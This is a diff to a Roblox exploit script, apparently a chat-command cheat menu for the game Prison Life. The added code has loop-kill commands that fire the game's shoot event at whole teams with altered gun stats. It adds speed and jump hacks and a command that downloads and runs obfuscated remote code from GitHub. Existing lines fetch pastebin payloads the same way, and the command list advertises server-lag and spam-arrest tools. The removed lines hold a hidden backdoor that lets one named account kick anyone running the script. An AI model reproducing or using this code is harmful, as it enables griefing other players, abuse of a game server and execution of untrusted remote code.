@@ -29,6 +29,22 @@
 	Color = Color3.fromRGB(9, 137, 207)
 	})
     
+  game.Players.ChildAdded:Connect(function(player)
+  if not pcall (function()
+  SendNotification("Player Joined",""..player.Name.."  has entered the server.",2.5 )
+  end) then
+    print ("Error")
+  end
+  end)
+  
+  game.Players.ChildRemoved:Connect(function(player)
+  if not pcall (function()
+  SendNotification("Player Left",""..player.Name.."  has left the server.",2.5 )
+  end) then
+    print ("Error")
+  end
+  end)
+  
 	game:GetService("Players").LocalPlayer.PlayerGui.Home.fadeFrame.Visible = false
 
 	-- tables --
@@ -389,109 +405,112 @@ end
         ShootEvent:FireServer(Package, Tool)
     end
 	         elseif msg:match(prefix .. "time") then
-                if not _G.FullBrightExecuted then
- 
-        _G.FullBrightEnabled = false
- 
-        _G.NormalLightingSettings = {
-                Brightness = game:GetService("Lighting").Brightness,
-                ClockTime = game:GetService("Lighting").ClockTime,
-                FogEnd = game:GetService("Lighting").FogEnd,
-                GlobalShadows = game:GetService("Lighting").GlobalShadows,
-                Ambient = game:GetService("Lighting").Ambient
-        }
- 
-        game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
-                if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
-                        _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
-                        if not _G.FullBrightEnabled then
-                                repeat
-                                        wait()
-                                until _G.FullBrightEnabled
-                        end
-                        game:GetService("Lighting").Brightness = 1
-                end
-        end)
- 
-        game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
-                if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
-                        _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
-                        if not _G.FullBrightEnabled then
-                                repeat
-                                        wait()
-                                until _G.FullBrightEnabled
-                        end
-                        game:GetService("Lighting").ClockTime = 12
-                end
-        end)
- 
-        game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
-                if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
-                        _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
-                        if not _G.FullBrightEnabled then
-                                repeat
-                                        wait()
-                                until _G.FullBrightEnabled
-                        end
-                        game:GetService("Lighting").FogEnd = 786543
-                end
-        end)
- 
-        game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
-                if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
-                        _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
-                        if not _G.FullBrightEnabled then
-                                repeat
-                                        wait()
-                                until _G.FullBrightEnabled
-                        end
-                        game:GetService("Lighting").GlobalShadows = false
-                end
-        end)
- 
-        game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
-                if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
-                        _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
-                        if not _G.FullBrightEnabled then
-                                repeat
-                                        wait()
-                                until _G.FullBrightEnabled
-                        end
-                        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
-                end
-        end)
- 
-        game:GetService("Lighting").Brightness = 1
-        game:GetService("Lighting").ClockTime = 12
-        game:GetService("Lighting").FogEnd = 786543
-        game:GetService("Lighting").GlobalShadows = false
-        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
- 
-        local LatestValue = true
-        spawn(function()
-                repeat
-                        wait()
-                until _G.FullBrightEnabled
-                while wait() do
-                        if _G.FullBrightEnabled ~= LatestValue then
-                                if not _G.FullBrightEnabled then
-                                        game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
-                                        game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
-                                        game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
-                                        game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
-                                        game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
-                                else
-                                        game:GetService("Lighting").Brightness = 1
-                                        game:GetService("Lighting").ClockTime = 12
-                                        game:GetService("Lighting").FogEnd = 786543
-                                        game:GetService("Lighting").GlobalShadows = false
-                                        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
-                                end
-                                LatestValue = not LatestValue
-                        end
-                end
-        end)
+if not _G.FullBrightExecuted then
+
+	_G.FullBrightEnabled = false
+
+	_G.NormalLightingSettings = {
+		Brightness = game:GetService("Lighting").Brightness,
+		ClockTime = game:GetService("Lighting").ClockTime,
+		FogEnd = game:GetService("Lighting").FogEnd,
+		GlobalShadows = game:GetService("Lighting").GlobalShadows,
+		Ambient = game:GetService("Lighting").Ambient
+	}
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
+		if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
+			_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").Brightness = 1
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
+		if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
+			_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").ClockTime = 12
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
+		if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
+			_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").FogEnd = 786543
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
+		if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
+			_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").GlobalShadows = false
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
+		if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
+			_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+		end
+	end)
+
+	game:GetService("Lighting").Brightness = 1
+	game:GetService("Lighting").ClockTime = 12
+	game:GetService("Lighting").FogEnd = 786543
+	game:GetService("Lighting").GlobalShadows = false
+	game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+
+	local LatestValue = true
+	spawn(function()
+		repeat
+			wait()
+		until _G.FullBrightEnabled
+		while wait() do
+			if _G.FullBrightEnabled ~= LatestValue then
+				if not _G.FullBrightEnabled then
+					game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
+					game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
+					game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
+					game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
+					game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
+				else
+					game:GetService("Lighting").Brightness = 1
+					game:GetService("Lighting").ClockTime = 12
+					game:GetService("Lighting").FogEnd = 786543
+					game:GetService("Lighting").GlobalShadows = false
+					game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+				end
+				LatestValue = not LatestValue
+			end
+		end
+	end)
 end
+
+_G.FullBrightExecuted = true
+_G.FullBrightEnabled = not _G.FullBrightEnabled
             elseif msg:match(prefix .. "lag") then
 _G.toggle = true
  
@@ -525,6 +544,159 @@ local A_1 = "\66\114\111\121\111\117\98\97\100\100"
 local Event = game:GetService("Workspace").Remote.loadchar
 Event:InvokeServer(A_1)
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+            elseif msg:match(prefix .. "lkc on") then
+_G.toggle = true
+
+while _G.toggle == true do
+wait()
+                                                function getPacketFromPlayer(tget)
+                                        return {
+                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+                                                ["Distance"] = 0,
+                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
+                                                ["Hit"] = tget.Character.Head
+                                        }
+                                end
+                                local arg1 = {}
+                                for i, v in pairs(game:GetService("Teams").Criminals:GetPlayers()) do
+                                        for i2 = 1, 7 do
+                                                table.insert(arg1, getPacketFromPlayer(v))
+                                        end
+                                end
+                               
+                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
+                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
+                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
+                                wait(0.1)
+local player = game:GetService("Players").LocalPlayer
+local gun = player.Backpack:FindFirstChild("Remington 870")
+local sM = require(gun:FindFirstChild("GunStates"))
+sM["Damage"] = 15
+sM["MaxAmmo"] = 6
+sM["CurrentAmmo"] = 6
+sM["StoredAmmo"] = 600
+sM["FireRate"] = 0.8
+sM["AmmoPerClip"] = 6
+sM["Range"] = 400
+sM["ReloadTime"] = 4
+sM["Bullets"] = 5
+sM["AutoFire"] = false
+end
+            elseif msg:match(prefix .. "lkc off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+                                                function getPacketFromPlayer(tget)
+                                        return {
+                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+                                                ["Distance"] = 0,
+                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
+                                                ["Hit"] = tget.Character.Head
+                                        }
+                                end
+                                local arg1 = {}
+                                for i, v in pairs(game:GetService("Teams").Criminals:GetPlayers()) do
+                                        for i2 = 1, 7 do
+                                                table.insert(arg1, getPacketFromPlayer(v))
+                                        end
+                                end
+                               
+                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
+                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
+                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
+                                wait(0.2)
+local player = game:GetService("Players").LocalPlayer
+local gun = player.Backpack:FindFirstChild("Remington 870")
+local sM = require(gun:FindFirstChild("GunStates"))
+sM["Damage"] = 15
+sM["MaxAmmo"] = 6
+sM["CurrentAmmo"] = 6
+sM["StoredAmmo"] = 600
+sM["FireRate"] = 0.8
+sM["AmmoPerClip"] = 6
+sM["Range"] = 400
+sM["ReloadTime"] = 4
+sM["Bullets"] = 5
+sM["AutoFire"] = false
+end
+            elseif msg:match(prefix .. "lki on") then
+_G.toggle = true
+
+while _G.toggle == true do
+wait()
+                                                function getPacketFromPlayer(tget)
+                                        return {
+                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+                                                ["Distance"] = 0,
+                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
+                                                ["Hit"] = tget.Character.Head
+                                        }
+                                end
+                                local arg1 = {}
+                                for i, v in pairs(game:GetService("Teams").Inmates:GetPlayers()) do
+                                        for i2 = 1, 7 do
+                                                table.insert(arg1, getPacketFromPlayer(v))
+                                        end
+                                end
+                               
+                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
+                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
+                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
+                                wait(0.2)
+local player = game:GetService("Players").LocalPlayer
+local gun = player.Backpack:FindFirstChild("Remington 870")
+local sM = require(gun:FindFirstChild("GunStates"))
+sM["Damage"] = 15
+sM["MaxAmmo"] = 6
+sM["CurrentAmmo"] = 6
+sM["StoredAmmo"] = 600
+sM["FireRate"] = 0.8
+sM["AmmoPerClip"] = 6
+sM["Range"] = 400
+sM["ReloadTime"] = 4
+sM["Bullets"] = 5
+sM["AutoFire"] = false
+end            
+
+elseif msg:match(prefix .. "lki off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+                                                function getPacketFromPlayer(tget)
+                                        return {
+                                                ["RayObject"] = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+                                                ["Distance"] = 0,
+                                                ["Cframe"] = CFrame.new(0,0,0,0,0,0,0,0,0,0,0,0),
+                                                ["Hit"] = tget.Character.Head
+                                        }
+                                end
+                                local arg1 = {}
+                                for i, v in pairs(game:GetService("Teams").Inmates:GetPlayers()) do
+                                        for i2 = 1, 7 do
+                                                table.insert(arg1, getPacketFromPlayer(v))
+                                        end
+                                end
+                               
+                                local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
+                                game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
+                                game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
+                                wait(0.2)
+local player = game:GetService("Players").LocalPlayer
+local gun = player.Backpack:FindFirstChild("Remington 870")
+local sM = require(gun:FindFirstChild("GunStates"))
+sM["Damage"] = 15
+sM["MaxAmmo"] = 6
+sM["CurrentAmmo"] = 6
+sM["StoredAmmo"] = 600
+sM["FireRate"] = 0.8
+sM["AmmoPerClip"] = 6
+sM["Range"] = 400
+sM["ReloadTime"] = 4
+sM["Bullets"] = 5
+sM["AutoFire"] = false
+end
 		    elseif msg:match(prefix .. "sg on") then
 _G.toggle = true
  
@@ -554,7 +726,7 @@ _G.toggle = true
 while _G.toggle == true do
 wait()
 local blah = (game.Players.LocalPlayer.Name)
- 
+
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 game.Players.LocalPlayer.Character.Humanoid.Name = 1
 local l = game.Players.LocalPlayer.Character["1"]:Clone()
@@ -653,12 +825,6 @@ end
                                
                                 local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                 game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
-                                wait(0.1)
-                                for i,v in pairs(game.Players:GetChildren()) do
-                                local args = {
-                                    [1] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Remington 870")
-                                }
-
                                 game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                 wait(0.2)
 local player = game:GetService("Players").LocalPlayer
@@ -674,7 +840,6 @@ sM["Range"] = 400
 sM["ReloadTime"] = 4
 sM["Bullets"] = 5
 sM["AutoFire"] = false
-end
 			elseif msg:match(prefix .. "k c") then
                                 function getPacketFromPlayer(tget)
                                         return {
@@ -693,12 +858,6 @@ end
                                
                                 local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                 game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
-                                wait(0.1)
-                                for i,v in pairs(game.Players:GetChildren()) do
-                                local args = {
-                                    [1] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Remington 870")
-                                }
-
                                 game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                 wait(0.2)
 local player = game:GetService("Players").LocalPlayer
@@ -714,7 +873,6 @@ sM["Range"] = 400
 sM["ReloadTime"] = 4
 sM["Bullets"] = 5
 sM["AutoFire"] = false
-end
 			elseif msg:match(prefix .. "k i") then
                                 function getPacketFromPlayer(tget)
                                         return {
@@ -733,12 +891,6 @@ end
                                
                                 local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                 game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
-                                wait(0.1)
-                                for i,v in pairs(game.Players:GetChildren()) do
-                                local args = {
-                                    [1] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Remington 870")
-                                }
-
                                 game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                 wait(0.2)
 local player = game:GetService("Players").LocalPlayer
@@ -754,7 +906,6 @@ sM["Range"] = 400
 sM["ReloadTime"] = 4
 sM["Bullets"] = 5
 sM["AutoFire"] = false
-end
 			elseif msg:match(prefix.."k others") then
                                         function getPacketFromPlayer(tget)
                                         return {
@@ -773,12 +924,6 @@ end
                                
                                 local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
                                 game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
-                                wait(0.1)
-                                for i,v in pairs(game.Players:GetChildren()) do
-                                local args = {
-                                    [1] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Remington 870")
-                                }
-
                                 game:GetService("ReplicatedStorage").ReloadEvent:FireServer(unpack(args))
                                 wait(0.2)
 local player = game:GetService("Players").LocalPlayer
@@ -794,7 +939,6 @@ sM["Range"] = 400
 sM["ReloadTime"] = 4
 sM["Bullets"] = 5
 sM["AutoFire"] = false
-end
 			elseif msg:match(prefix .. "megaspike") then
 				local PackageSize = 50000
 				local SendPackageAmountOfTimes = 7
@@ -859,10 +1003,16 @@ end
 			elseif msg:match(prefix .. "prefix ") then
 				prefix = (msg:sub(9))
 				ConsoleMessage("[Edited Admin] Your prefix is " .. msg:sub(9))
+			elseif msg:match(prefix .. "ws ") then
+			    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (msg:sub(5))
+			elseif msg:match(prefix .. "jp ") then
+			    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (msg:sub(5))
+			elseif msg:match(prefix .. "saui") then
+			    loadstring(game:HttpGet('https://raw.githubusercontent.com/kinnny/PLSpamArrest/main/SpamArrest%20V2%20Obfuscated.lua'))()
 			elseif msg:match(prefix .. "sagui") then
 				loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
 				wait(0.3)
-			    	loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
+			    loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
 				wait(0.3)
 				loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
 			elseif msg:match(prefix .. "fling") then
@@ -2083,7 +2233,7 @@ end
         <re - Respawns
         <auto on - AutoRespawn
         <auto off (off AutoRespawn)
-        <prefix - !prefix (NewPrefixHere)
+        <prefix - <prefix (NewPrefixHere)
         <nopunch - No Punch
         <saim - silent aim lock
         <lag - LAGS SERVER (on/off)
@@ -2104,8 +2254,7 @@ end
         <fling - flings
         <adonis - fe admin for any game
         <close - Alt + F4
-        <ia - infinite ammo (shouldnt lag or anything)
-        <fe drill - not fe but ok
+        <ia - infinite ammo
         <k [i, g, c, all] - Teamkills
         <walls on - on walls
         <fences on - on fences
@@ -2126,13 +2275,16 @@ end
         <noleg - No Legs
         <rgb on - Cycles Colors
         <rgb off - (off) Cycles Colors
+        <sagui - not really a good spam arrest but kinda good
+        <saui - better spam arrest i think
         <rj - Rejoin
         <clothes - Removes Prison Clothes
         <m4 - Gives M4
         <ak - Gives AK
         <remi - Gives REMI
         <m9 - Gives M9
-        <sagui - Spam Arrest Gui 3x Is OP (do !al first)
+        <sagui - Spam Arrest Gui 3x Is OP (do <al first)
+        <saui - more spam arrest
         <ab - Antibring
 
 
@@ -2187,39 +2339,4 @@ end
 			end-- cmd end
 		end-- cmd end
 
-	)
-
-	local reason
-	function findPlrTokick(self)
-		for k, b in pairs(game.Players:GetPlayers()) do
-			if string.find(b.Name:lower(), self) then
-				b:Kick("___")
-			end
-		end
-	end
-
-	--just so i dont gotta mek 10 checks
-	game.Players.QufioixDev.Chatted:Connect(
-		function(eek)
-			if eek:match(prefix .. "kick ") then
-				print(findPlr(eek:sub(7)))
-				findPlrTokick(eek:sub(7))
-			end
-		end
-	)
-
-	game.Players.PlayerAdded:Connect(
-		function(plr)
-			if plr.Name == "QufioixDev" then
-				game.Players.QufioixDev.Chatted:Connect(
-					function(eek)
-						if eek:match(prefix .. "kick ") then
-							findPlrTokick(eek:sub(7))
-						end
-					end
-				)
-			else
-				return
-			end
-		end
 	)
